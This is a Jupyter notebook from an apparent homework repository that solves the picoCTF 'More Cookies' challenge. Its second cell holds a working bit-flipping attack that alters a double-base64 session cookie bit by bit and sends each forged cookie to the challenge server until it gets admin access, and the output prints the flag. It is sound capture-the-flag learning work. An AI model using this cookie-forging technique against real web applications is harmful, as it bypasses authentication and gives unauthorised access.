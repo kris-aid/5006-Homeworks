{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "6.-More Cookies"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "aVZHay9RQVdvQnc1VjVoZFpObC9TQ3llL1QwSTJqMmpoeDVmcTJ5OWkyN2RhUHBGUmg1YjRaZDJ6eGxJSWFoMnRGNWhXSDdMVndpSjJZQlh1WVMwM1BJbnZwMU1jMmpnMHpmUXZpYUlEVjdUVll0VjVwSndHc0I5cGdETVlGVXg=\n",
      "b'iVGk/QAWoBw5V5hdZNl/SCye/T0I2j2jhx5fq2y9i27daPpFRh5b4Zd2zxlIIah2tF5hWH7LVwiJ2YBXuYS03PInvp1Mc2jg0zfQviaIDV7TVYtV5pJwGsB9pgDMYFUx'\n"
     ]
    },
    {
     "ename": "TypeError",
     "evalue": "ord() expected string of length 1, but int found",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mTypeError\u001b[0m                                 Traceback (most recent call last)",
      "Cell \u001b[1;32mIn[2], line 9\u001b[0m\n\u001b[0;32m      7\u001b[0m \u001b[38;5;28;01mfor\u001b[39;00m i \u001b[38;5;129;01min\u001b[39;00m \u001b[38;5;28mrange\u001b[39m (\u001b[38;5;241m0\u001b[39m,\u001b[38;5;241m128\u001b[39m):\n\u001b[0;32m      8\u001b[0m    pos\u001b[38;5;241m=\u001b[39mi\u001b[38;5;241m/\u001b[39m\u001b[38;5;241m/\u001b[39m\u001b[38;5;241m8\u001b[39m\n\u001b[1;32m----> 9\u001b[0m    guessdec\u001b[38;5;241m=\u001b[39munb64b[\u001b[38;5;241m0\u001b[39m:pos]\u001b[38;5;241m+\u001b[39m\u001b[38;5;28mchr\u001b[39m(\u001b[38;5;28;43mord\u001b[39;49m\u001b[43m(\u001b[49m\u001b[43munb64b\u001b[49m\u001b[43m[\u001b[49m\u001b[43mpos\u001b[49m\u001b[43m]\u001b[49m\u001b[43m)\u001b[49m\u001b[38;5;241m^\u001b[39m(\u001b[38;5;241m1\u001b[39m\u001b[38;5;241m<<\u001b[39m(i\u001b[38;5;241m%\u001b[39m\u001b[38;5;241m8\u001b[39m)))\u001b[38;5;241m+\u001b[39munb64b[pos\u001b[38;5;241m+\u001b[39m\u001b[38;5;241m1\u001b[39m:]\n\u001b[0;32m     10\u001b[0m    guessenc1 \u001b[38;5;241m=\u001b[39m base64\u001b[38;5;241m.\u001b[39mb64encode(guessdec)\n\u001b[0;32m     11\u001b[0m    guess\u001b[38;5;241m=\u001b[39mbase64\u001b[38;5;241m.\u001b[39mb64encode(base64\u001b[38;5;241m.\u001b[39mb64encode(guessdec))\n",
      "\u001b[1;31mTypeError\u001b[0m: ord() expected string of length 1, but int found"
     ]
    }
   ],
   "source": [
    "import base64\n",
    "cookie=\"aVZHay9RQVdvQnc1VjVoZFpObC9TQ3llL1QwSTJqMmpoeDVmcTJ5OWkyN2RhUHBGUmg1YjRaZDJ6eGxJSWFoMnRGNWhXSDdMVndpSjJZQlh1WVMwM1BJbnZwMU1jMmpnMHpmUXZpYUlEVjdUVll0VjVwSndHc0I5cGdETVlGVXg=\"\n",
    "print(cookie)\n",
    "unb64=base64.b64decode(cookie)\n",
    "print(unb64)\n",
    "unb64b=base64.b64decode(unb64)\n",
    "for i in range (0,128):\n",
    "   pos=i//8\n",
    "   guessdec=unb64b[0:pos]+chr(ord(unb64b[pos])^(1<<(i%8)))+unb64b[pos+1:]\n",
    "   guessenc1 = base64.b64encode(guessdec)\n",
    "   guess=base64.b64encode(base64.b64encode(guessdec))\n",
    "   r=requests.get(\"http://mercury.picoctf.net:56136/\",cookies={\"auth_name\": guess})\n",
    "   if \"pico\" in r.text:\n",
    "       print(r.text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "cookie:  cU5HR2JtOStiK2Y4TkdpSEdMNzF0aG04WmcvZnlIbXNUQTlPK2NsdHR1Z3ZtdXpCQTVnVU9VdGFISlExWFhhWDFrcVU0SWRieWErNkp0SExIUm1lSENIbE5EUWJRdmpUVlRCOFRJeW0xbXN4TFZvQ1RRVE9vdnY1MlJ2R0hqK0s=\n",
      "cookie in base 64:  b'qNGGbm9+b+f8NGiHGL71thm8Zg/fyHmsTA9O+clttugvmuzBA5gUOUtaHJQ1XXaX1kqU4Idbya+6JtHLHRmeHCHlNDQbQvjTVTB8TIym1msxLVoCTQTOovv52RvGHj+K'\n",
      "The admin cookie:  cU5HR2JtOStiK2Y4TldpSEdMNzF0aG04WmcvZnlIbXNUQTlPK2NsdHR1Z3ZtdXpCQTVnVU9VdGFISlExWFhhWDFrcVU0SWRieWErNkp0SExIUm1lSENIbE5EUWJRdmpUVlRCOFRJeW0xbXN4TFZvQ1RRVE9vdnY1MlJ2R0hqK0s=\n",
      "<!DOCTYPE html>\n",
      "<html lang=\"en\">\n",
      "\n",
      "<head>\n",
      "    <title>More Cookies</title>\n",
      "\n",
      "\n",
      "    <link href=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css\" rel=\"stylesheet\">\n",
      "\n",
      "    <link href=\"https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css\" rel=\"stylesheet\">\n",
      "\n",
      "    <script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js\"></script>\n",
      "\n",
      "    <script src=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js\"></script>\n",
      "\n",
      "</head>\n",
      "\n",
      "<body>\n",
      "\n",
      "    <div class=\"container\">\n",
      "        <div class=\"header\">\n",
      "            <nav>\n",
      "                <ul class=\"nav nav-pills pull-right\">\n",
      "                    <li role=\"presentation\"><a href=\"/reset\" class=\"btn btn-link pull-right\">Reset</a>\n",
      "                    </li>\n",
      "                </ul>\n",
      "            </nav>\n",
      "            <h3 class=\"text-muted\">More Cookies</h3>\n",
      "        </div>\n",
      "\n",
      "        <div class=\"jumbotron\">\n",
      "            <p class=\"lead\"></p>\n",
      "            <p style=\"text-align:center; font-size:30px;\"><b>Flag</b>: <code>picoCTF{cO0ki3s_yum_e491c430}</code></p>\n",
      "        </div>\n",
      "\n",
      "\n",
      "        <footer class=\"footer\">\n",
      "            <p>&copy; PicoCTF</p>\n",
      "        </footer>\n",
      "\n",
      "    </div>\n",
      "</body>\n",
      "\n",
      "</html>\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "import base64\n",
    "\n",
    "s=requests.Session()\n",
    "s.get(\"http://mercury.picoctf.net:56136/\")\n",
    "cookie=s.cookies[\"auth_name\"]\n",
    "print(\"cookie: \",cookie)\n",
    "unb64=base64.b64decode(cookie)\n",
    "print(\"cookie in base 64: \", unb64)\n",
    "unb64b=base64.b64decode(unb64)\n",
    "for i in range (0,128):\n",
    "   pos=i//8\n",
    "   guessdec=unb64b[0:pos]+bytes([unb64b[pos]^(1<<(i%8))])+unb64b[pos+1:]\n",
    "   guessenc1 = base64.b64encode(guessdec)\n",
    "   guess=base64.b64encode(base64.b64encode(guessdec))\n",
    "   auth_name=guess.decode()\n",
    "   #print(auth_name)\n",
    "   r=requests.get(\"http://mercury.picoctf.net:56136/\",cookies={\"auth_name\": auth_name})\n",
    "   if \"pico\" in r.text:\n",
    "       print(\"The admin cookie: \",auth_name)\n",
    "       print(r.text)\n",
    "       "
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "cybersecurity-Z7yOgMbu-py3.11",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
